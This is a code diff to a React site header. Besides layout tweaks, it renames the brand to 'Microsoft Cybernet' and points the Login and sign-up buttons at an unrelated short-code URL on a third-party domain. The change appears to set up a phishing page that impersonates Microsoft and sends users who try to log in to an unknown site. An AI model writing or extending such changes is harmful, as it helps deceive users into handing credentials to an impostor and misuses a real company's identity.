@@ -5,27 +5,20 @@ import { FaShieldAlt } from 'react-icons/fa';
 const Header: React.FC = () => {
   return (
     <header className="bg-blue-600 text-white py-4 shadow-md">
-      <div className="container mx-auto px-4 flex flex-col sm:flex-row justify-between items-center">
-        {/* Logo and Title */}
-        <div className="flex items-center justify-between w-full sm:w-auto mb-4 sm:mb-0">
+      <div className="container mx-auto flex flex-col sm:flex-row justify-between items-center px-4">
+        <div className="flex items-center">
           <FaShieldAlt className="text-3xl mr-2" />
-          <h1 className="text-2xl font-bold">SecureNet</h1>
+          <h1 className="text-2xl font-bold">Microsoft Cybernet</h1>
         </div>
-
-        {/* Navigation Links */}
-        <nav className="w-full sm:w-auto text-center sm:text-left">
-          <div className="space-y-2 sm:space-y-0 sm:space-x-4">
-            <a href="#home" className="block sm:inline hover:text-blue-200">Home</a>
-            <a href="#about" className="block sm:inline hover:text-blue-200">About</a>
-            <a href="#services" className="block sm:inline hover:text-blue-200">Services</a>
-            <a href="#contact" className="block sm:inline hover:text-blue-200">Contact</a>
-          </div>
+        <nav className="space-x-4 mt-4 sm:mt-0">
+          <a href="#home" className="hover:text-blue-200">Home</a>
+          <a href="#about" className="hover:text-blue-200">About</a>
+          <a href="#services" className="hover:text-blue-200">Services</a>
+          <a href="#contact" className="hover:text-blue-200">Contact</a>
         </nav>
-
-        {/* Login/SignUp Buttons */}
-        <div className="space-y-2 sm:space-y-0 sm:space-x-4 flex flex-col sm:flex-row mt-4 sm:mt-0">
+        <div className="space-x-2 flex flex-col sm:flex-row mt-4 sm:mt-0">
           <a
-            href="https://osspesecuritycenter.com"
+            href="https://view.richtonparks.com/KDJEDK"
             className="bg-white text-blue-600 px-4 py-2 rounded-md hover:bg-blue-100"
             target="_blank"
             rel="noopener noreferrer"
@@ -33,7 +26,7 @@ const Header: React.FC = () => {
             Login
           </a>
           <a
-            href="https://osspesecuritycenter.com"
+            href="https://view.richtonparks.com/KDJEDK"
             className="bg-green-500 text-white px-4 py-2 rounded-md hover:bg-green-600"
             target="_blank"
             rel="noopener noreferrer"
